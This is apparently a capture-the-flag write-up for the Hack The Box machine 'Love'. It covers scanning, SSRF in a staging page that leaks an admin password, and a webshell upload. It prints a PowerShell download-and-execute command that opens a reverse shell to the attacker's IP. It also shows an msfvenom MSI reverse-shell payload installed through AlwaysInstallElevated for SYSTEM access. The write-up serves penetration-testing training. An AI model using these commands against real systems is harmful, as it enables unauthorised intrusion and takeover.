# Love
## Information Gathering
#### Master List
- Port 443
	- From nmap scan
		- User: `roy@love.htb`
		- commonName=staging.love.htb
		- organizationName=ValentineCorp
		- localityName=norway
		- OrganizationalUnit=love.htb
	- @ 10.10.10.239/admin.php
		- Possible user enumeration from error code returned
	- Added staging.love.htb and love.htb to /etc/hosts
		- staging.love.htb/index.php - "We are not live yet..." may imply we are presented with a testing area
		- staging.love.htb/beta.php
			- Started up python server and hosted dummy docx to see if the remote server can reach me
				- http://10.10.14.10:1337/vuln.docx - we get a ping back
			- There is a SSRF @ staging.love.htb/beta.php in the file input field
				- http://localhost - baseline
				- gopher://localhost:3306 - we can reach the database

#### Ports/Services
x 135/tcp     msrpc        
445/tcp     microsoft-ds 
5000/tcp    http         
5040/tcp    unknown      
5985/tcp    http         
7680/tcp    pando-pub?   
47001/tcp   http         
49664/tcp   msrpc        
49665/tcp   msrpc        
49666/tcp   msrpc        
49667/tcp   msrpc        
49668/tcp   msrpc        
49669/tcp   msrpc        
49670/tcp   msrpc

#### Software
- Port 443
	- Apache httpd 2.4.46
	- OpenSSL/1.1.1j
	- PHP/7.3.27

## Enumeration
#### Nmap scan
```bash
PORT     STATE SERVICE      REASON          VERSION
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
443/tcp  open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/organizationalUnitName=love.htb/emailAddress=roy@love.htb
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/organizationalUnitName=love.htb/emailAddress=roy@love.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
| SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
| -----BEGIN CERTIFICATE-----
| MIIDozCCAosCFFhDHcnclWJmeuqOK/LQv3XDNEu4MA0GCSqGSIb3DQEBCwUAMIGN
| MQswCQYDVQQGEwJpbjEKMAgGA1UECAwBbTEPMA0GA1UEBwwGbm9yd2F5MRYwFAYD
| VQQKDA1WYWxlbnRpbmVDb3JwMREwDwYDVQQLDAhsb3ZlLmh0YjEZMBcGA1UEAwwQ
| c3RhZ2luZy5sb3ZlLmh0YjEbMBkGCSqGSIb3DQEJARYMcm95QGxvdmUuaHRiMB4X
| DTIxMDExODE0MDAxNloXDTIyMDExODE0MDAxNlowgY0xCzAJBgNVBAYTAmluMQow
| CAYDVQQIDAFtMQ8wDQYDVQQHDAZub3J3YXkxFjAUBgNVBAoMDVZhbGVudGluZUNv
| cnAxETAPBgNVBAsMCGxvdmUuaHRiMRkwFwYDVQQDDBBzdGFnaW5nLmxvdmUuaHRi
| MRswGQYJKoZIhvcNAQkBFgxyb3lAbG92ZS5odGIwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQDQlH1J/AwbEm2Hnh4Bizch08sUHlHg7vAMGEB14LPq9G20
| PL/6QmYxJOWBPjBWWywNYK3cPIFY8yUmYlLBiVI0piRfaSj7wTLW3GFSPhrpmfz0
| 0zJMKeyBOD0+1K9BxiUQNVyEnihsULZKLmZcF6LhOIhiONEL6mKKr2/mHLgfoR7U
| vM7OmmywdLRgLfXN2Cgpkv7ciEARU0phRq2p1s4W9Hn3XEU8iVqgfFXs/ZNyX3r8
| LtDiQUavwn2s+Hta0mslI0waTmyOsNrE4wgcdcF9kLK/9ttM1ugTJSQAQWbYo5LD
| 2bVw7JidPhX8mELviftIv5W1LguCb3uVb6ipfShxAgMBAAEwDQYJKoZIhvcNAQEL
| BQADggEBANB5x2U0QuQdc9niiW8XtGVqlUZOpmToxstBm4r0Djdqv/Z73I/qys0A
| y7crcy9dRO7M80Dnvj0ReGxoWN/95ZA4GSL8TUfIfXbonrCKFiXOOuS8jCzC9LWE
| nP4jUUlAOJv6uYDajoD3NfbhW8uBvopO+8nywbQdiffatKO35McSl7ukvIK+d7gz
| oool/rMp/fQ40A1nxVHeLPOexyB3YJIMAhm4NexfJ2TKxs10C+lJcuOxt7MhOk0h
| zSPL/pMbMouLTXnIsh4SdJEzEkNnuO69yQoN8XgjM7vHvZQIlzs1R5pk4WIgKHSZ
| 0drwvFE50xML9h2wrGh7L9/CSbhIhO8=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?       syn-ack ttl 127
| fingerprint-strings: 
|   SSLv23SessionReq: 
|_    Host '10.10.14.10' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '10.10.14.10' is not allowed to connect to this MariaDB server
5000/tcp open  http         syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27

```

From the TLS certificate we see a CN staging.love.htb. I add love.htb and staging.love.htb.
At love.htb, run a gobuster
```bash
$ gobuster dir -u http://love.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,html,php

/images               (Status: 301) [Size: 338] [--> http://www.love.htb/images/]
/admin                (Status: 301) [Size: 337] [--> http://www.love.htb/admin/]
/plugins              (Status: 301) [Size: 339] [--> http://www.love.htb/plugins/]
/includes             (Status: 301) [Size: 340] [--> http://www.love.htb/includes/]
/dist                 (Status: 301) [Size: 336] [--> http://www.love.htb/dist/]
/Plugins              (Status: 301) [Size: 339] [--> http://www.love.htb/Plugins/]
/Includes             (Status: 301) [Size: 340] [--> http://www.love.htb/Includes/]
/Dist                 (Status: 301) [Size: 336] [--> http://www.love.htb/Dist/]
/login.php            (Status: 302) [Size: 0] [--> index.php]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/Home.php             (Status: 302) [Size: 0] [--> index.php]
/Login.php            (Status: 302) [Size: 0] [--> index.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/preview.php          (Status: 302) [Size: 0] [--> index.php]
/index.php            (Status: 200) [Size: 4388]
```

## Exploitation
Navigating to http://staging.love.htb/beta.php, it seems to be some site scanner for malware, similar to VirusTotal. 

After trying a few inputs, I decide to spin up a temporary HTTP server `python3 http.server 8080` and make a temp doc to see if I can get a connection back which I can.

I then try http://127.0.0.1 and get the same login prompt as http://love.htb/index.php. It's pretty clear that this is a SSRF. 

I fiddle around a bit with the SSRF trying to dump credentials from 3306. root does not need a password to login to the DB and I dump the admin hash. However, John is never able to crack the password. 

I try other ports and eventually, http://127.0.0.1:5000 dumps the admin password in cleartext as `admin:@LoveIsInTheAir!!!!`

I use these credentials to login to http://love.htb/admin.php

After a bit of poking around in the admin console, I see that I can upload images in a few different places. 
- Profile picture
- /admin/voters.php
- /admin/candidates.php

I upload webshell.php from the profile picture but don't see anything in http://love.htb/images. I then try the same thing for /admin/voters.php. Boom, I have a webshell. Running `whoami` and I get back that I'm `love\phoebe`

Almost there...

I do the three stage AV:
1. Get Invoke-PowerShellTcp.ps1 (don't forget to add `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 53` to the bottom of the script) and start up a python webserver with `python -m http.server 8080`
2. Start your reverse shell `nc -lnvp 53`
3. In the webshell execute `powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10:8080')`

This **finally** gets you foothold

## Privilege Escalation
After fiddling around for a while looking at different applications installed in Program Files and Program Files (x86) and looking at UAC stuff, I decided to run winPEASany.exe.

We get a low-hanging fruit in the form of AlwaysInstallElevated. I verify the results;
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	0x1
	
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	0x1
```

I generate a MSI reverse shell payload with msfvenom
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=666 -f msi -o reverse.msi
```

Transfer this file over however you like. Startup a reverse shell `nc -lnvp 666` and install
```powershell
msiexec /quiet /qn /i reverse.msi
```

You get a root shell